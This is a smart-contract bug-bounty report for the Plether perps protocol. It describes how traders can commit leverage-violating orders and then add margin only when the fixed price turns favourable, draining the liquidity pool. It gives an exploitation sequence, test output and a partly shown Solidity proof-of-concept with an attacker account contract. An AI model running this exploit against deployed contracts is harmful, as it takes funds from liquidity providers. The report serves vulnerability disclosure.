# \#99664 [SC-Low] Owner-mutable leverage checks allow selective execution of queued orders and LP losses

**Submitted on Nov 14th 2026 at 18:06:59 UTC by @Ox175 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99664
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A trader with an open position can commit a same-side increase that violates its own `maxPostLeverageBps` bound, and the Router accepts it. The order's price is fixed at the first oracle tick after the commit (`PletherOracle.sol:596-640`) and the order stays executable for up to 60 seconds. The trader watches later prices and calls `addMargin` only if that fixed price has become favourable. The added margin satisfies the bound and the increase fills at the original price. Without that call, every execution rejects the order and returns its margin. A partial close can be switched the same way, and a rejected close costs no bounty. Queued orders are documented as binding; these bind only when their owner wants them to, and profitable exercises extract funds from the HousePool.

## Vulnerability Details

`_commitOrder` stores a request's financial bounds without evaluating them (`router/OrderLiquidationBatchLogic.sol:214-268`); the planner preview at commit only rejects `CommitTimeRejectable` codes (`:404-454`). At execution, `_buildOpenAssessment` computes post-trade leverage from the position's current margin and `_enforceBounds` reverts with `ConstraintViolation` when it exceeds `maxPostLeverageBps` (`CfdOrderPolicyEvaluatorBase.sol:325-387, 490-540`). The Router treats that as terminal, releases the order's margin, and returns the bounty to the account if it executed or pays it to the executor otherwise (`OrderRouterExecutionSidecar.sol:879-893`, `OrderRouter.sol:314-343`). Position margin can be raised at any time by `CfdEngine.addMargin`, which requires `msg.sender == account` (`CfdEngine.sol:501-529`).

`SECURITY.md:658-659` states that "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options". Here a keeper can reject the unmodified order, which costs the trader the 0.2-token bounty, but cannot force a fill the trader does not want. In test 01, from one snapshot and with the same first post-commit tick: executed untouched, the order ends in `ConstraintViolation` (`PostLeverage`, 4,155,751 bps against the 2,000,000 limit) and the owner's wealth is unchanged; after a third party donates 100,000 tokens with `depositFor`, the result is identical, because free settlement is not part of the leverage calculation; after the owner calls `addMargin(22,000)`, it executes at the same price. Self-rejection leaves sixteen ledger fields equal to never committing (test 03), and a second trader address can reject for free as well (test 02).

Partial closes are affected in the same way. A full close skips the two post-position checks, but for a partial close `_enforceBounds` tests the residual position's leverage and equity against current margin (`CfdOrderPolicyEvaluatorBase.sol:439-471, 490-540`), and close commitment evaluates neither. Pledge is released pro rata, so a `maxPostLeverageBps` ceiling below the position's present leverage, or a `minPostPositionEquityAssets` floor above the residual's equity, fails until the owner adds margin (C01 and C09; tests prefixed C are in the partial-close test file). Three things follow. A close reserves no bounty, so a keeper's rejection costs the holder no tokens, only gas (C08). The route works while the Router is paused and in close-only windows, when the increase cannot be committed (C06, C07); degraded mode was not tested. And it serves any existing position holder, with no new increase.

This differs from letting an open lapse at its deadline, which is reported separately. An ordinary open can be filled by any keeper, so that option exists only while nobody executes; a prompt keeper filling a LONG and SHORT pair costs the trader 42,807.05 tokens on the ticks used below (test 14). Here the same keeper costs 0.4 tokens and nothing fills. Pricing every fill at the less favourable of the first tick and a current tick, proposed there, would remove the demonstrated gain of both reports; deadline or bounty changes would not affect this one. SC-M4's first-tick correction is present and is not circumvented (test 12b). Remediation must cover increases and partial closes alike. Evaluate bounds at commit and reject violations on both paths, or assess them against margin recorded at commit, including for the residual of a partial close. Disallowing `addMargin` only while an open is pending leaves the close route exposed; any such restriction must also apply while a partial close is pending. Rerouting the bounty does not help: a second address collects it, and a close has none.

## Impact Details

Test 07 replays the 2026-11-06 13:30 UTC data release with one LONG and one SHORT account. The two wallets go from 136,000 to 138,600.736609 tokens and the HousePool loses 5,679.629064; the treasury receives 3,071.081403 in fees and the keeper 7.811052, and the four changes sum to zero. The wallet figure is after base-position costs and nineteen earlier two-sided attempts that a keeper rejected (8.655265 tokens together). Gas is separate: 51 attacker transactions, roughly 8 to 27 USD at 0.03 to 0.1 gwei and an assumed 4,000 USD per ETH. The USD 8-27 estimate covers execution gas; mainnet L1 data fees are not measured. The replay is a reconstruction. Pool size is an assumed 20,000,000 tokens. EUR/USD and USD/JPY, 71% of the basket, are Pyth's own ticks; the other four feeds are modelled from a fit to authentic six-feed ticks. The exercised position carries market risk until its close fills.

Ordinary orders on the same ticks lose: the binding pair above loses 42,807.05 and an order committed after seeing the move loses 5,826.48, against +4,487.34 for the switch at the same valuation tick (test 14). On a favourable 25 bp path the switch and a binding order end within 0.21 tokens of each other (+13,060.64); on the unfavourable path the binding order loses 25,062.90 and the switch 3.14 (test 04). The advantage is entirely the avoided loss.

In the partial-close replay (C05: the same release, assumed pool and modelled feeds, a SHORT holder of 2,000,000 units), nineteen keeper-rejected attempts cost zero tokens. The holder finishes 2,589.018845 tokens better off than the same holder closing after observing the move, while HousePool receives 2,589.440097 fewer tokens. These are differences against the control: the holder's absolute result remains -1,621.158289 tokens. This is a separate measurement from the increase figures above; the two are not to be added together.

The increase replay's LONG leg stays profitable when the four modelled feeds are held still (+1,207.91), when their confidence is doubled (+2,105.14) and when the exit is delayed one to three seconds (+2,409.19 to +4,489.36) (test 15). On the 2026-08-07 release with modelled confidence doubled, the oracle rejects the close; it must expire and be recommitted, and the attack still nets +10,617.17 (test 16). Applied to 109 release windows from April to November 2026, the same pre-set rule fires ten times, eight profitably, for +52,705 tokens if the trader is always first. Whether the trader is first is not measured. The keeper's block delay comes from 320 executions on the public testnet deployment, the trader's own inclusion delay is an assumption, and a model combining them gives an expected +16,046 tokens at 0.3 seconds down to +2,592 at 2.1 seconds, positive in every sensitivity case tested. These model totals exclude failed-attempt bounties and gas; two open-order bounties per window total at most 43.6 tokens across 109 attempts. These are conditional estimates, not a production success rate. Break-even is a move of about 8.2 bp in the trader's favour, 8.8 to 10.6 bp around releases.

## References

- `packages/perps/SECURITY.md:658-659, 719, 726-728`: binding orders, no cancellation, constraint violations are terminal.
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:214-268, 404-454`: commit stores bounds unevaluated.
- `packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:325-387, 490-540`: leverage computed from current margin; bound enforcement.
- `packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:439-471`; `packages/perps/src/libraries/CloseAccountingLib.sol:96`; `packages/perps/src/router/OrderLiquidationBatchLogic.sol:316-318`: residual checks on partial closes, pro-rata pledge release, open-only gates.
- `packages/perps/src/CfdEngine.sol:501-529`: `addMargin`, owner-only.
- `packages/perps/src/OrderRouterExecutionSidecar.sol:879-893`; `packages/perps/src/OrderRouter.sol:314-343`: terminal rejection and bounty settlement.
- Keeper timing and six-feed ticks: public Arbitrum Sepolia v2.0.0 deployment. EUR/USD and USD/JPY release ticks: Pyth history API.

## Proof of Concept

## Proof of Concept

Exploitation sequence, all through public Router, Engine and Clearinghouse calls:

1. Fund an attacker-owned account with 68,000 settlement tokens and open a small 1,100-unit LONG position with 10 tokens of margin. This makes `addMargin` available.
2. Commit a same-side increase of 8,000,000 units with 45,000 tokens of reserved margin and `maxPostLeverageBps = 2,000,000`, a 200x limit. The order is accepted even though its uncured post-trade leverage exceeds that limit.
3. Let the first eligible post-commit oracle tick fix the execution price. The order remains pending.
4. Observe a later price off-chain. For this LONG example a falling basket is favourable. Apply the predetermined exercise rule (a favourable move of at least 8.5 bp) without using the future closing price.
5. If favourable, act before a keeper rejects the order: atomically call `addMargin(account, 22,000)` and `executeOrder` with the first eligible tick. The added margin satisfies the leverage bound and the increase fills at that original price.
6. Otherwise, execute without adding margin. Execution ends with `ConstraintViolation`, releasing the order margin and returning the bounty when the owner executes. If an independent keeper rejects first, the attempt costs the reserved 0.2-token bounty plus gas.
7. After a successful fill, commit a close, execute it at its own first eligible tick, and withdraw. Measure complete trader wealth and HousePool changes after settlement.

To cover both directions, a second account holds a small SHORT and commits the opposite increase in the same way. Execution is first-in-first-out, so if the later order is the favoured one, the trader first rejects the earlier order by executing it unmodified, then exercises the later one (tests 07 and 09).

Partial-close route (test C05). A holder commits a partial close whose leverage ceiling is below the position's current leverage. Keepers can only reject it, at no token cost. After an adverse move the holder calls `addMargin` and executes the exit at the earlier first eligible tick.

Runnable test. Scoped revision `a82d4fefb02768e5b3bddcc97dee371eee24fea8`; all 125 scoped source files match `scope/SHA256SUMS` before and after the run, and no in-scope contract is modified. The only mocks are the settlement token and Pyth. Orders use the production `commitOrder(OrderRequest)` entrypoint and explicit `MockPyth.FeedUpdate[]` payloads with unique-tick semantics. Two out-of-scope release wrappers are mirrored (25% adverse-confidence multiplier, 1,000-token minimum notional). Price inputs are labelled in the source as synthetic shifts of the repository's signed six-feed fixture, or release ticks with two authentic and four modelled feeds. One file holds both routes: tests 01 to 16 are the increase, C01 to C09 the partial close. Numbering follows the full 28-test suite; the tests not cited in this report are left out for length and are available on request. Save the source below as `packages/perps/test/perps/spec/oracle/OwnerSwitchCondensedPoC.t.sol` and run:

```bash
forge test --offline -j 1 --root packages/perps --match-path test/perps/spec/oracle/OwnerSwitchCondensedPoC.t.sol -vv
```

Result excerpt (17 passed, 0 failed; token amounts in atoms, 6 decimals):

```text
[PASS] test_01_OwnerMarginAloneDecides()
  A post-trade leverage, no owner margin (bps): 4155751
  A declared maxPostLeverageBps: 2000000
[PASS] test_04_SwitchVersusBindingAndFreshOrders()
  favourable 25 bp, persists
     switch, absolute wealth change (atoms): 13060636178
     binding order (atoms): 13060431254
  unfavourable 25 bp
     switch, absolute wealth change (atoms): -3136217
     binding order (atoms): -25062903870
[PASS] test_07_AuthenticRelease_FullyAccounted()
  bases and 19 rejected two-sided attempts cost (atoms): 8655265
  end wallets (atoms): 138600736609
  NET, wallet to wallet (atoms): 2600736609
  HousePool change (atoms): -5679629064
  treasury change (atoms): 3071081403
  keeper bounties (atoms): 7811052
  attacker transactions: 51
  attacker gas (Forge units): 67354421
[PASS] test_08_BreakEvenMove()
  break-even favourable move (ppm): 824
[PASS] test_14_AuthenticPath_SwitchVersusBindingAndFresh()
  switch on both sides, absolute change (atoms): 4487339928
  binding LONG and SHORT (atoms): -42807047911
  fresh LONG after observation (atoms): -5826480959
[PASS] test_15_ReleaseReplaySensitivity()
  four feeds do not move: fires at R+3, closes at tick R+4 -> attacker (atoms): 1207909172
  confidence doubled: fires at R+2, closes at tick R+3 -> attacker (atoms): 2105140281
  exit 2 s later: fires at R+2, closes at tick R+5 -> attacker (atoms): 4489364229
  exit 3 s later: fires at R+2, closes at tick R+6 -> attacker (atoms): 2409190309
[PASS] test_16_RejectedCloseLifecycle()
  2026-08-07 confidence doubled: fires at R+3, closes at tick R+7 after 1 rejected close(s), expired and recommitted -> attacker (atoms): 10617165931
[PASS] test_C01_OwnerMarginAloneDecidesThePartialClose()
  A post-trade leverage, no owner margin (bps): 538478
  A declared maxPostLeverageBps: 376559
[PASS] test_C05_AuthenticRelease_FullyAccounted()
  NET, wallet to wallet (atoms): -1621158289
  HousePool change (atoms): 853050269
  net without any pending order (atoms): -4210177134
  difference attributable to the switch (atoms): 2589018845
  HousePool change without any pending order (atoms): 3442490366
(tests 02, 03, 09, 12b, C06, C07, C08 and C09 also pass; they print no logs)
Suite result: ok. 17 passed; 0 failed; 0 skipped
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {MockSettlementToken} from "../../../utils/MockSettlementToken.sol";
import {BasePerpTest} from "../../BasePerpTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types as O} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";

/// Mirrors the out-of-scope release wrapper: 25% adverse-confidence multiplier.
contract ReleaseParamOracle is PletherOracle {
  constructor(address engine_, address pool_, address pyth_, bytes32[] memory feedIds_, uint256[] memory quantities_, uint256[] memory basePrices_, bool[] memory inversions_)
    PletherOracle(engine_, pool_, pyth_, feedIds_, quantities_, basePrices_, inversions_)
  {
    adverseConfidenceMultiplierBps = 2500;
  }
}

interface IAddMargin {
  function addMargin(address account, uint256 amount) external;
}

/// Attacker-owned account contract: adds margin and executes in one transaction.
contract OwnerSwitchAccount {
  address immutable owner = msg.sender;
  OrderRouter immutable router;
  MarginClearinghouse immutable clearinghouse;

  constructor(OrderRouter router_, MarginClearinghouse clearinghouse_, IERC20 token_) {
    router = router_;
    clearinghouse = clearinghouse_;
    token_.approve(address(clearinghouse_), type(uint256).max);
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "owner");
    _;
  }

  function deposit(uint256 amount) external onlyOwner { clearinghouse.deposit(address(this), amount); }

  function commit(O.OrderRequest calldata request) external onlyOwner returns (uint64) { return router.commitOrder(request); }

  function execute(uint64 orderId, bytes[] calldata data, address engine, uint256 addMarginAssets) external onlyOwner returns (O.ExecutionResult memory) {
    if (addMarginAssets != 0) IAddMargin(engine).addMargin(address(this), addMarginAssets);
    return router.executeOrder(orderId, data);
  }
}

/// Tests 01-16: increase route. Tests C01-C09: partial-close route. Amounts are atoms (6 decimals). Price inputs:
/// `_tick` = the repository's signed six-feed Pyth fixture with a synthetic shift; `_rel` = release ticks, EUR/USD
/// and USD/JPY authentic, four feeds modelled. Pool size (10M + 10M) is assumed.
contract OwnerSwitchCondensedPoC is BasePerpTest {
  O.TerminalReason constant FILLED = O.TerminalReason.Executed;
  O.TerminalReason constant REJECTED = O.TerminalReason.ConstraintViolation;
  CfdTypes.Side constant LONG = CfdTypes.Side.LONG;
  CfdTypes.Side constant SHORT = CfdTypes.Side.SHORT;

  uint256 constant POOL_SEED = 10_000_000e6;
  uint256 constant BOUND_CAPITAL = 68_000e6; // per attacker account
  uint256 constant TINY_BASE = 1100e18; // makes addMargin available
  uint256 constant BIG_INCREASE = 8_000_000e18;
  uint256 constant BIG_MARGIN = 45_000e6; // reserved with the increase
  uint256 constant CURE = 22_000e6; // addMargin that satisfies the bound
  uint32 constant BOUND = 2_000_000; // maxPostLeverageBps, 200x
  int256 constant RULE_PPM = 850; // exercise rule: favourable move >= 8.5 bp
  uint32 constant CLOSE_WINDOW = 2;
  uint256 constant INV_SIZE = 2_000_000e18; // partial-close route
  uint256 constant INV_MARGIN = 40_000e6;
  uint256 constant INV_CAPITAL = 120_000e6;
  uint256 constant RESIDUAL = 1100e18; // left open by the partial close

  MockPyth mockPyth;
  bytes32[] feedIds;
  uint256[] quantities;
  uint256[] basePrices;
  bool[] inversions;
  address alice = address(0xA11CE);
  address sybil = address(0x5B11);
  address keeper = address(0xBEE9);
  address trader = address(0x7AD3);
  address trader2 = address(0x7AD4);
  address holder = address(0xC105E);
  uint256 t0;
  uint256 T;
  uint256 gasMeter;
  uint256 txMeter;

  function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
    return CfdTypes.RiskParams({
      vpiFactor: 0.01e18, maxSkewRatio: 0.4e18, maintMarginBps: 10, initMarginBps: 20, fadMarginBps: 300,
      baseCarryBps: 500, minBountyAssets: 1e6, bountyBps: 10, keeperShareBps: 5000, protocolShareBps: 0
    });
  }

  function setUp() public override {
    settlementToken = new MockSettlementToken();
    mockPyth = new MockPyth();
    clearinghouse = new MarginClearinghouse(address(settlementToken));
    engine = _deployEngine(_riskParams());
    _syncEngineAdmin();
    engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(engine.CAP_PRICE()))));
    pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
    seniorVault = new TrancheVault(IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0));
    juniorVault = new TrancheVault(IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0));
    pool.setSeniorVault(address(seniorVault));
    pool.setJuniorVault(address(juniorVault));
    engine.setPool(address(pool));
    // Release basket: EUR, JPY, GBP, CAD, SEK, CHF.
    bytes32[6] memory ids = [
      bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
      0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52,
      0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1,
      0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca,
      0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676,
      0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8
    ];
    uint256[6] memory weights = [uint256(576e15), 136e15, 119e15, 91e15, 42e15, 36e15];
    uint256[6] memory bases = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
    for (uint256 i; i < 6; ++i) {
      feedIds.push(ids[i]);
      quantities.push(weights[i]);
      basePrices.push(bases[i]);
      inversions.push(i != 0 && i != 2);
    }
    engineLens = new CfdEngineLens(address(engine));
    pletherOracle = new ReleaseParamOracle(address(engine), address(pool), address(mockPyth), feedIds, quantities, basePrices, inversions);
    router = _deployLegacyOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
    _syncRouterAdmin();
    engine.setOrderRouter(address(router));
    _bypassAllTimelocks();
    settlementToken.mint(address(this), POOL_SEED * 2);
    settlementToken.approve(address(pool), POOL_SEED * 2);
    pool.initializeSeedPosition(false, POOL_SEED, address(0x1999));
    pool.initializeSeedPosition(true, POOL_SEED, address(0x1999));
    pool.activateTrading();
    IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
    config.minOpenNotionalAssets = 1000e6;
    _setRouterConfig(config);
    // Release parameters in force.
    assertEq(router.minOpenNotionalAssets(), 1000e6);
    assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
    assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10);
    assertEq(pletherOracle.orderSettlementWindow(), 15);
    assertEq(router.maxExecutionWindowSeconds(), 60);
    assertEq(engine.executionFeeBps(), 4);
    assertEq(router.maxOpenOrderExecutionBountyAssets(), 200_000);
    t0 = SETUP_TIMESTAMP + 7 days + 600;
    vm.warp(t0 - 60);
  }

  // ---- price inputs

  function _encode(uint256[6] memory price, uint256[6] memory conf, bool release, uint256 pt, uint256 prev) internal view returns (bytes[] memory data) {
    MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
    for (uint256 i; i < 6; ++i) {
      int32 expo = !release ? int32(-8) : i == 1 ? int32(-3) : int32(-5);
      updates[i] = MockPyth.FeedUpdate(feedIds[i], MockPyth.MockPrice(int64(uint64(price[i])), uint64(conf[i]), expo, pt, prev));
    }
    data = new bytes[](1);
    data[0] = abi.encode(updates);
  }

  /// Signed fixture `arbitrum-sepolia.json` (prices and confidences at expo -8), basket shifted by `shiftPpm`.
  function _tick(int256 shiftPpm, uint256 pt, uint256 prev) internal view returns (bytes[] memory) {
    uint256[6] memory price = [uint256(114_356_000), 15_745_200_000, 133_353_000, 140_695_000, 986_491_000, 82_165_000];
    uint256 factor = uint256(int256(1e6) + shiftPpm);
    for (uint256 i; i < 6; ++i) {
      price[i] = inversions[i] ? (price[i] * 1e6) / factor : (price[i] * factor) / 1e6;
    }
    return _encode(price, [uint256(4000), 700_000, 4000, 4000, 86_000, 3000], false, pt, prev);
  }

  /// Release ticks: ev 0 = 2026-11-06 13:30:00 UTC, ev 2 = 2026-08-07 12:30:00 UTC. Row k is the tick of second R+k-1.
  /// Columns: six prices, six confidences (EUR, JPY, GBP, CAD, SEK, CHF; JPY expo -3, others -5). EUR and JPY are
  /// Pyth's ticks; the other four are modelled (`_relVar`).
  function _rel(uint8 ev, uint8 k) internal pure returns (uint256[6] memory price, uint256[6] memory conf) {
    uint32[12] memory row;
    if (ev == 0) {
      row = [
        [uint32(111643), 158356, 132343, 142614, 1002638, 83476, 7, 11, 17, 21, 503, 14],
        [uint32(111643), 158349, 132344, 142613, 1002633, 83476, 8, 12, 20, 24, 575, 16],
        [uint32(111644), 158349, 132345, 142612, 1002627, 83475, 9, 17, 22, 26, 647, 18],
        [uint32(111504), 158440, 132221, 142746, 1003567, 83554, 61, 91, 152, 180, 4392, 123],
        [uint32(111480), 158483, 132197, 142772, 1003747, 83569, 24, 107, 60, 71, 1729, 49],
        [uint32(111468), 158532, 132183, 142787, 1003857, 83578, 18, 35, 45, 53, 1297, 36],
        [uint32(111462), 158538, 132177, 142793, 1003899, 83581, 10, 35, 25, 29, 721, 20],
        [uint32(111484), 158473, 132201, 142767, 1003715, 83566, 25, 37, 62, 74, 1801, 51]
      ][k];
    } else {
      row = [
        [uint32(115286), 158348, 132346, 142611, 1002617, 83475, 8, 7, 19, 23, 557, 16],
        [uint32(115283), 158345, 132344, 142613, 1002633, 83476, 11, 15, 27, 31, 765, 22],
        [uint32(115283), 158347, 132344, 142613, 1002634, 83476, 11, 16, 27, 31, 765, 22],
        [uint32(115406), 158340, 132443, 142507, 1001885, 83414, 44, 187, 106, 125, 3056, 86],
        [uint32(115454), 158088, 132505, 142440, 1001418, 83375, 14, 36, 34, 40, 971, 27],
        [uint32(115531), 158009, 132573, 142366, 1000898, 83332, 59, 54, 142, 167, 4089, 115],
        [uint32(115545), 158005, 132585, 142354, 1000811, 83324, 46, 68, 111, 130, 3187, 90],
        [uint32(115540), 157969, 132584, 142354, 1000815, 83325, 11, 68, 27, 31, 762, 21],
        [uint32(115568), 157934, 132610, 142327, 1000622, 83309, 26, 56, 63, 74, 1801, 51],
        [uint32(115619), 157832, 132660, 142273, 1000243, 83277, 38, 154, 92, 108, 2630, 74]
      ][k];
    }
    for (uint256 i; i < 6; ++i) {
      price[i] = row[i];
      conf[i] = row[i + 6];
    }
  }

  function _relTick(uint8 ev, uint8 k, uint256 pt, uint256 prev) internal view returns (bytes[] memory) {
    (uint256[6] memory price, uint256[6] memory conf) = _rel(ev, k);
    return _encode(price, conf, true, pt, prev);
  }

  /// Model of the four other feeds: `othersPct` scales how far they follow EUR and JPY (100 = fitted), `confPct`
  /// scales their confidence (100 = 90th-percentile ratios).
  function _relVar(uint8 ev, uint8 k, uint256 othersPct, uint256 confPct) internal pure returns (uint256[6] memory price, uint256[6] memory conf) {
    (uint256[6] memory p, uint256[6] memory c) = _rel(ev, k);
    (uint256[6] memory origin,) = _rel(ev, 1);
    int256 rE = (int256(p[0]) - int256(origin[0])) * 1e12 / int256(origin[0]);
    int256 rJ = (int256(origin[1]) - int256(p[1])) * 1e12 / int256(p[1]);
    int256 g = (3566 * 5684 * rE + 2302 * 1404 * rJ) / 29_120_000 * int256(othersPct) / 100;
    uint256 up = uint256(int256(1e12) + g);
    price[0] = p[0];
    price[1] = p[1];
    price[2] = (132_344 * up + 5e11) / 1e12;
    price[3] = (142_613 * 1e12 + up / 2) / up;
    price[4] = (1_002_633 * 1e12 + up / 2) / up;
    price[5] = (83_476 * 1e12 + up / 2) / up;
    conf[0] = c[0];
    conf[1] = c[1];
    uint256[4] memory ratioTenths = [uint256(21), 23, 80, 27];
    for (uint256 i = 2; i < 6; ++i) {
      uint256 v = (price[i] * c[0] * ratioTenths[i - 2] * confPct + (p[0] * 500)) / (p[0] * 1000);
      conf[i] = v == 0 ? 1 : v;
    }
  }

  /// The oracle's basket arithmetic, checked against the oracle in test 15.
  function _basket(uint256[6] memory price, uint256[6] memory conf) internal view returns (uint256 basket, uint256 confidence) {
    for (uint256 i; i < 6; ++i) {
      uint256 expoDigits = i == 1 ? 3 : 5;
      uint256 denominator = basePrices[i] * 1e10;
      if (inversions[i]) {
        uint256 scaled = 10 ** (26 + expoDigits);
        uint256 weighted = ((scaled + price[i] / 2) / price[i]) / 1e18 * quantities[i] / denominator;
        uint256 lower = price[i] - conf[i];
        basket += weighted;
        confidence += ((scaled + lower / 2) / lower) / 1e18 * quantities[i] / denominator - weighted;
      } else {
        uint256 weighted = price[i] * 10 ** (8 - expoDigits) * quantities[i] / denominator;
        basket += weighted;
        confidence += weighted * conf[i] / price[i];
      }
    }
  }

  /// Basket the oracle reports for a tick; reverts if outside the confidence limit. State is restored.
  function _observe(bytes[] memory tick) internal returns (uint256 basket) {
    uint256 fork = vm.snapshotState();
    router.updateMarkPrice(tick);
    basket = engine.lastMarkPrice();
    vm.revertToState(fork);
  }

  function _seenPpm(bytes[] memory entryTick, bytes[] memory laterTick) internal returns (int256 ppm) {
    int256 entry = int256(_observe(entryTick));
    ppm = (int256(_observe(laterTick)) - entry) * 1e6 / entry;
    _log("basket move at tick R+2 against the first eligible tick R+1 (ppm)", ppm);
  }

  // ---- actions

  function _at(uint256 timestamp) internal {
    vm.warp(timestamp);
    vm.roll(vm.getBlockNumber() + 1);
  }

  function _mark(int256 shiftPpm, uint256 pt) internal { router.updateMarkPrice(_tick(shiftPpm, pt, pt - 1)); }

  /// Counts every non-keeper transaction and sums its execution gas.
  modifier metered(address who) {
    uint256 g = gasleft();
    _;
    if (who != keeper) {
      gasMeter += g - gasleft();
      ++txMeter;
    }
  }

  function _request(CfdTypes.Side side, uint256 sizeDelta, uint256 marginDelta, bool isClose) internal view returns (O.OrderRequest memory request) {
    uint256 max = type(uint256).max;
    request = O.OrderRequest({
      clientOrderId: bytes32(uint256(router.nextCommitId())), side: side, sizeDelta: sizeDelta, marginDelta: marginDelta,
      targetPrice: (side == LONG) != isClose ? 1 : max, isClose: isClose,
      bounds: O.ExecutionBounds({
        submitBy: uint64(vm.getBlockTimestamp()) + 60, executionWindowSeconds: 60, allowedExecutionModes: 7,
        expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
        maxExecutionBountyAssets: max, maxExecutionNotionalAssets: max, maxGrossAccountDebitAssets: max,
        maxActionChargeAssets: max, maxExplicitFeesAssets: max, maxPostPositionSize: max,
        minPostSettlementBalanceAssets: 0, minPostPositionEquityAssets: 0, maxPostLeverageBps: type(uint32).max
      })
    });
  }

  /// The increase. `BOUND` makes it the switch; uint32 max makes it an ordinary binding order.
  function _increase(CfdTypes.Side side, uint32 maxPostLeverageBps) internal view returns (O.OrderRequest memory request) {
    request = _request(side, BIG_INCREASE, BIG_MARGIN, false);
    request.bounds.maxPostLeverageBps = maxPostLeverageBps;
  }

  function _mint(address who, uint256 amount) internal {
    settlementToken.mint(who, amount);
    vm.prank(who);
    settlementToken.approve(address(clearinghouse), type(uint256).max);
  }

  function _deposit(address who, uint256 amount) internal metered(who) {
    vm.prank(who);
    clearinghouse.deposit(who, amount);
  }

  function _fund(address who, uint256 amount) internal {
    _mint(who, amount);
    _deposit(who, amount);
  }

  function _commit(address who, O.OrderRequest memory request) internal metered(who) returns (uint64 id) {
    vm.prank(who);
    id = router.commitOrder(request);
  }

  function _addMargin(address who, uint256 amount) internal metered(who) {
    vm.prank(who);
    engine.addMargin(who, amount);
  }

  function _exec(address who, uint64 id, bytes[] memory data, O.TerminalReason want) internal metered(who) returns (O.ExecutionResult memory r) {
    vm.prank(who);
    r = router.executeOrder(id, data);
    assertEq(uint8(r.terminalReason), uint8(want));
  }

  /// Executes and returns the receipt from the lifecycle book's `OrderFinalized` event.
  function _execR(address who, uint64 id, bytes[] memory data, O.TerminalReason want) internal returns (O.OrderReceipt memory receipt) {
    vm.recordLogs();
    _exec(who, id, data, want);
    Vm.Log[] memory logs = vm.getRecordedLogs();
    for (uint256 i; i < logs.length; ++i) {
      if (logs[i].topics.length == 4 && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector && uint256(logs[i].topics[1]) == id) {
        (,,, receipt) = abi.decode(logs[i].data, (bytes32, uint64, uint64, O.OrderReceipt));
        return receipt;
      }
    }
    revert("receipt not found");
  }

  function _withdrawAll(address who) internal metered(who) {
    uint256 free = _free(who);
    vm.prank(who);
    clearinghouse.withdrawMargin(free);
  }

  /// Full close, executed at its own first tick.
  function _closeAll(address who, CfdTypes.Side side, uint256 commitTime, address executor, bytes[] memory fill) internal {
    _at(commitTime);
    uint64 id = _commit(who, _request(side, _size(who), 0, true));
    _at(commitTime + 2);
    _exec(executor, id, fill, FILLED);
    assertEq(_size(who), 0);
  }

  function _closeSelf(address who, CfdTypes.Side side, uint256 commitTime, int256 shiftPpm) internal { _closeAll(who, side, commitTime, who, _tick(shiftPpm, commitTime + 1, commitTime)); }

  // ---- views

  function _size(address who) internal view returns (uint256 size) { (size,,,,,,) = engine.positions(who); }

  function _free(address who) internal view returns (uint256) { return clearinghouse.getPnlIsolationBuckets(who).freeSettlementAssets; }

  function _wealth(address who) internal view returns (uint256) { return settlementToken.balanceOf(who) + clearinghouse.balanceAssets(who) + engine.traderClaimBalanceAssets(who); }

  function _log(string memory key, int256 value) internal { emit log_named_int(key, value); }

